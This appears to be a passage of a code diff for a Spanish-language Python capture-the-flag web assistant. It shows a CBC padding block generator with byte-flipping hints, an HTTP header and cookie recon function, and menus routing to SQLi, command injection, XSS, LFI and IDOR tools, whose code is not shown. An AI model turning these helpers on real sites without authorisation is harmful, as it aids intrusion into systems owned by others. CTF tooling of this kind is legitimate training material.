+            print(f"\n[*] IV (Bloque 0): {blocks[0].hex()}")
+            print(f"[*] C1 (Bloque 1): {blocks[1].hex()}")
+            
+            padding_byte = bytes([1]) * block_size
+            print("\n[🛠️] Bloque de Manipulación Útil (Un Byte de Padding):")
+            print(f"   - Bloque de 1 byte de padding: {padding_byte.hex()}")
+            print("   - **Usa este bloque y XORéalo con el IV para manipular el último byte del texto plano.**")
+
+        input("\n[✅] Generador de Bloques completado. Presiona ENTER para continuar...")
+
+    def tool_recon(self):
+        print("\n[🛠️] Módulo: Reconocimiento (Headers & Tech)")
+        print("---------------------------------------------")
+        target_url = input("Ingresa la URL base (ej: http://ejemplo.com): ")
+        
+        try:
+            response = requests.get(target_url, timeout=5)
+            
+            print(f"\n[🔗] URL Probada: {target_url}")
+            print(f"[*] Código de Estado HTTP: {response.status_code}")
+            
+            print("\n[🔍] Encabezados de Respuesta:")
+            interesting_headers = ["Server", "X-Powered-By", "Content-Type", "Set-Cookie", "Location", "X-Frame-Options", "Content-Security-Policy"]
+            for header in interesting_headers:
+                if header in response.headers:
+                    print(f"   -> {header}: {response.headers[header]}")
+            
+            if response.cookies:
+                print("\n[🍪] Cookies (Sesiones):")
+                for cookie in response.cookies:
+                    print(f"   -> {cookie.name}: {cookie.value}")
+                    if cookie.name.lower() in ['session', 'token', 'jwt']:
+                        print("      💡 Posible token de sesión crítico.")
+
+            techs = []
+            if 'X-Powered-By' in response.headers: techs.append(response.headers['X-Powered-By'])
+            if 'PHPSESSID' in response.cookies: techs.append("PHP")
+            if 'ASP.NET' in response.headers: techs.append("ASP.NET")
+
+            if techs:
+                print(f"\n[💡] Posibles Tecnologías Detectadas: {', '.join(set(techs))}")
+
+        except requests.exceptions.RequestException as e:
+            print(f"❌ Error de conexión: {e}")
+            
+        input("\n[✅] Análisis de Reconocimiento completado. Presiona ENTER para volver al menú...")
+
+    def show_injection_menu(self):
+        while True:
+            print("\n╔══════════════════════════════════════════╗")
+            print("║        [1] MENÚ DE INYECCIÓN             ║")
+            print("╠══════════════════════════════════════════╣")
+            print("║ 1. SQL Injection (SQLi) Tool             ║")
+            print("║ 2. Command Injection Tool                ║") 
+            print("║ 9. Volver al Menú Principal              ║")
+            print("╚══════════════════════════════════════════╝")
+            
+            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
+            
+            if choice == '1':
+                self.tool_sqli()
+            elif choice == '2':
+                self.tool_command_injection()
+            elif choice == '9':
+                break
+            else:
+                print("Opción no válida. Inténtalo de nuevo.")
+
+    def show_security_menu(self):
+        while True:
+            print("\n╔══════════════════════════════════════════╗")
+            print("║     [2] MENÚ DE SEGURIDAD ESPECÍFICA     ║")
+            print("╠══════════════════════════════════════════╣")
+            print("║ 1. XSS Payload Generator                 ║")
+            print("║ 2. LFI / Path Traversal Tool             ║")
+            print("║ 3. Authz & Sesiones (CSRF, IDOR)         ║") 
+            print("║ 9. Volver al Menú Principal              ║")
+            print("╚══════════════════════════════════════════╝")
+            
+            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
+            
+            if choice == '1':
+                self.tool_xss()
+            elif choice == '2':
+                self.tool_lfi()
+            elif choice == '3':
+                self.tool_authz()
+            elif choice == '9':
+                break
+            else:
+                print("Opción no válida. Inténtalo de nuevo.")
+
+    def show_utilities_menu(self):
+        while True:
+            print("\n╔══════════════════════════════════════════╗")
+            print("║      [3] MENÚ DE UTILIDADES AVANZADAS    ║")
+            print("╠══════════════════════════════════════════╣")
+            print("║ 1. Reconocimiento (Ing. Inversa/Headers) ║")
+            print("║ 2. Criptografía y Tokens                 ║") 
+            print("║ 3. Lógica de Negocio y Serialización     ║")
+            print("║ 9. Volver al Menú Principal              ║")
+            print("╚══════════════════════════════════════════╝")
+            
+            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
+            
+            if choice == '1':
+                self.tool_recon()
+            elif choice == '2':
+                self.tool_crypto_analysis()
+            elif choice == '3':
+                self.tool_logic_analysis()
+            elif choice == '9':
+                break
+            else:
+                print("Opción no válida. Inténtalo de nuevo.")
+
+    def main_menu(self):
+        while True:
+            try:
+                print("\n╔══════════════════════════════════════════╗")
+                print("║     [🔥] CTF WEB ASSISTANT V5.1 [🔥]     ║")
+                print("╠══════════════════════════════════════════╣")
+                print("║ 1. Ataques de Inyección (SQLi, Command)  ║")
+                print("║ 2. Seguridad Específica (XSS, LFI, AuthZ)║")
+                print("║ 3. Utilidades Avanzadas (Recon, Crypto, Lógica)║")
+                print("║ 4. Salir (Ctrl+C también funciona)       ║")
+                print("╚══════════════════════════════════════════╝")
+                
+                choice = input("Selecciona una opción: ")
+                
+                if choice == '1':
+                    self.show_injection_menu()
+                elif choice == '2':
+                    self.show_security_menu()
+                elif choice == '3':
+                    self.show_utilities_menu()
+                elif choice == '4':
+                    print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
+                    sys.exit(0)
+                else:
+                    print("Opción no válida. Inténtalo de nuevo.")
+
+            except KeyboardInterrupt:
+                print("\n\n¡Herramienta finalizada! ¡Buena suerte! 🚀")
+                sys.exit(0)
+                
+            except Exception as e:
+                print(f"\nOcurrió un error inesperado (Tipo: {type(e).__name__}, Mensaje: {e}).") 
+                input("Presiona ENTER para volver al menú...")
 
 def main():
-    """Función de entrada principal."""
-    main_menu()
+    assistant = CTFAssistant()
+    assistant.main_menu()
 
 if __name__ == "__main__":
     main()
